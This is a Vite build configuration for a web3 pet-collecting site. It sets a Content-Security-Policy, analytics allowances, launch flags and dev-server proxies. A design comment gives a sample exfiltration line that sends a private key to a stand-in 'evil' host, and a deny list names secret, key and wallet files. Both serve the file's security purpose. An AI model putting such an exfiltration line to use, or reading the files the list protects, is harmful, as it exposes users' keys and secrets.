import tailwindcss from '@tailwindcss/vite';
import react from '@vitejs/plugin-react';
import { defineConfig, loadEnv } from 'vite';

/**
 * A Content-Security-Policy on the built site, and only on the built site (the dev server needs inline script and a
 * websocket for hot reload, and the tag would block both).
 *
 * What it is for: this origin derives and holds a real private key, and it renders SVG that comes off the chain. The
 * one line that matters is `script-src 'self'` — it stops an injected `<img onerror=…>` or `<script src=…>` from
 * running here at all, which is the difference between a defaced page and a drained account.
 *
 * What it is NOT: an exfiltration control. CSP cannot stop `location = 'https://evil/?k=' + key`, and it is blind to
 * a first-party compromise (a bad release of a dependency loads from 'self' like everything else). `connect-src` is
 * therefore drawn to keep the site working, not to pretend to be an airlock.
 *
 * `frame-ancestors` cannot be set from a meta tag; it has to come from a response header (the Worker sets it on the
 * pages it owns, and the rest needs a Cloudflare rule). Without it this page can be framed and click-jacked.
 */
/**
 * Google Analytics (G-4QWLXTDH20, the same property as emonad.lol). Operator's decision, 2026-09-22, taken with
 * the trade-off stated: googletagmanager.com can now run script on the origin that derives passkey keys.
 *
 * What is deliberately NOT here is 'unsafe-inline'. Google's own snippet is an inline script, and allowing inline
 * script would be far worse than allowing Google's: it would let any injected inline script execute next to the
 * key material. The bootstrap is served from /ga.js instead, so 'self' already covers it.
 */
// A path, not the whole host (security review, 2026-09-27): the host would admit gtm.js?id=<anyone's container>, whose
// custom-JS variables are arbitrary script, so any HTML injection would become script again. /gtag/ is what GA4 loads
// (gtag/js, and gtag/destination when it has one); gtm.js lives at the root and does not match.
const GA_SCRIPT = ['https://www.googletagmanager.com/gtag/'];
const GA_CONNECT = ['https://www.google-analytics.com', 'https://*.google-analytics.com', 'https://*.analytics.google.com', 'https://*.googletagmanager.com'];

/**
 * Emotown's live sockets (the town square and each person's inbox, worker/social/rooms.js) are on this same origin.
 * CSP Level 3 lets 'self' match wss:, but older Safari does not, so the socket origin is named outright.
 */
const SOCKETS = ['wss://emogotchi.emonad.lol'];

function csp(rpc: string, wc: boolean) {
  // the RPC this build reads from, and Monad's other free public endpoints it falls back to (packages/chain rpcTransport)
  const rpcs = [rpc, ...(rpc.replace(/\/$/, '') === 'https://rpc.monad.xyz' ? ['https://rpc1.monad.xyz', 'https://rpc2.monad.xyz', 'https://rpc3.monad.xyz'] : [])];
  const connect = ["'self'", ...SOCKETS, ...rpcs, ...GA_CONNECT, ...(wc ? ['https://*.walletconnect.com', 'https://*.walletconnect.org', 'wss://*.walletconnect.com', 'wss://*.walletconnect.org', 'https://*.web3modal.org', 'https://*.reown.com', 'wss://*.reown.com'] : [])];
  return {
    name: 'emogotchi-csp',
    apply: 'build' as const,
    transformIndexHtml(html: string) {
      const policy = [
        "default-src 'self'",
        `script-src 'self' ${GA_SCRIPT.join(' ')}`,
        // the on-chain drawings carry style="" attributes, and inline style cannot execute anything
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: blob: https:",
        "media-src 'self' blob: data:",
        "font-src 'self' data:",
        `connect-src ${connect.join(' ')}`,
        "base-uri 'none'",
        "object-src 'none'",
        "form-action 'none'",
        "frame-src 'none'",
      ].join('; ');
      // right after the charset, which must stay in the first 1,024 bytes: Cloudflare serves HTML without a charset, so
      // the page's own declaration is what the browser reads (the policy is ~800 bytes and was pushing it out)
      const tag = `<meta http-equiv="Content-Security-Policy" content="${policy}">`;
      return /<meta charset="UTF-8" \/>/.test(html) ? html.replace(/<meta charset="UTF-8" \/>/, (m) => `${m}\n    ${tag}`) : html.replace('<head>', `<head>\n    ${tag}`);
    },
  };
}

/**
 * Fight Club's local world (tools/fightclub/local.mjs sets FIGHTCLUB_LOCAL=1): the dev server otherwise sends /api to
 * production, and a fresh passkey account on the local fork would ask the LIVE Worker's drip for its starter, which sends
 * real MON on mainnet to a throwaway address. The local faucet funds accounts instead; referrals are local noise too.
 * Both are refused here, before the proxy.
 */
function localOnly() {
  return {
    name: 'fightclub-local-only',
    configureServer(server: { middlewares: { use: (path: string, fn: (req: unknown, res: { statusCode: number; setHeader: (k: string, v: string) => void; end: (b: string) => void }) => void) => void } }) {
      if (process.env.FIGHTCLUB_LOCAL !== '1') return;
      for (const path of ['/api/drip', '/api/refer']) server.middlewares.use(path, (_req, res) => { res.statusCode = 503; res.setHeader('content-type', 'application/json'); res.end('{"error":"off in the Fight Club local world: use the local faucet"}'); });
    },
  };
}

export default defineConfig(({ mode }) => {
  const env = loadEnv(mode, process.cwd(), 'VITE_');
  // The fourth pet's switch: his contract address, or '' while he is not launched. Every mention of him in the site is
  // behind it (`__THICCUMS__ ? … : …`), so with it empty the minifier drops all of them and a build carries nothing of
  // him (checked by grepping dist). Set VITE_THICCUMS_ADDRESS in .env.local to switch him on.
  const thiccums = /^0x[0-9a-fA-F]{40}$/.test(env.VITE_THICCUMS_ADDRESS ?? '') ? env.VITE_THICCUMS_ADDRESS : '';
  // The fifth pet's switch, the same way: r3tardgotchi's contract address, or '' until he is launched. His mint page
  // (/r3tardgotchi) is on the site either way and says "Coming soon" while this is empty; everything else of him (his
  // pets' pages, the gallery, Get a pet, the stats...) is behind `__R3TARDS__`. VITE_R3TARDS_ADDRESS in .env.local.
  const r3tards = /^0x[0-9a-fA-F]{40}$/.test(env.VITE_R3TARDS_ADDRESS ?? '') ? env.VITE_R3TARDS_ADDRESS : '';
  // The sixth pet's switch, Thiccums' way (nothing of him in a production build until launch, his mint page included):
  // Emonadgotchi's contract address, or ''. VITE_EMONAD_ADDRESS in .env.local (tools/emonad-launch.mjs writes it).
  const emonad = /^0x[0-9a-fA-F]{40}$/.test(env.VITE_EMONAD_ADDRESS ?? '') ? env.VITE_EMONAD_ADDRESS : '';
  // Sound (src/sound/): on in every dev build, and in a production build only with VITE_SOUND=on in .env.local. With
  // it off the minifier drops the engine's import and the sound controls, and the build carries none of it but the
  // few lines of sound/cue.ts that every caller's cues fall into.
  const sound = mode !== 'production' || env.VITE_SOUND === 'on';
  return {
  define: { __THICCUMS__: JSON.stringify(thiccums), __R3TARDS__: JSON.stringify(r3tards), __EMONAD__: JSON.stringify(emonad), __SOUND__: JSON.stringify(sound) },
  plugins: [localOnly(), react(), tailwindcss(), csp(env.VITE_RPC_URL || 'https://rpc.monad.xyz', !!env.VITE_WC_PROJECT_ID)],
  build: { outDir: 'dist', emptyOutDir: true },
  // the LAN dev server is sometimes exposed through a Cloudflare quick tunnel for phone testing
  server: {
    allowedHosts: ['.trycloudflare.com'],
    // The dev server can serve any file under the repo root, and it is sometimes on the LAN or a tunnel. Vite's own
    // deny list is only .env, certificates and .git; these are the other files in this tree nobody should fetch
    // (the Worker's local secrets, fuzz findings, wallet snapshots, a wrangler tail with visitor IPs, keystores).
    fs: {
      deny: ['.env', '.env.*', '*.{crt,pem,key}', '**/.git/**', '**/.dev.vars*', '**/.wrangler/**', '**/ultrafuzz/**', '**/snapshot/**', '**/pfp-moments/**', '**/keystore*/**', '**/*.jsonl', '**/findings*.json'],
    },
    // the gallery's index lives in a Cloudflare Worker on the real domain; borrow it in dev so the
    // local site behaves like the published one (name search needs the names it returns)
    // VITE_SOCIAL_API=http://127.0.0.1:8798 points Emotown's social layer (and its websockets) at a local
    // `wrangler dev` instead (the first matching key wins, so it goes before /api). changeOrigin matters: when a
    // request's Origin equals its Host, wrangler dev rewrites the Origin to the route's host (emogotchi.emonad.lol),
    // and the Worker's same-origin check then refuses every write; with the Host changed, Origin passes untouched.
    proxy: {
      ...(env.VITE_SOCIAL_API ? { '/api/social': { target: env.VITE_SOCIAL_API, changeOrigin: true, ws: true } } : {}),
      // VITE_TOPUP_API=http://127.0.0.1:8799 points "Add MON from another chain" at a local Worker (wrangler dev)
      ...(env.VITE_TOPUP_API ? { '/api/topup': { target: env.VITE_TOPUP_API, changeOrigin: true } } : {}),
      '/api': { target: 'https://emogotchi.emonad.lol', changeOrigin: true, secure: true },
    },
  },
  };
});
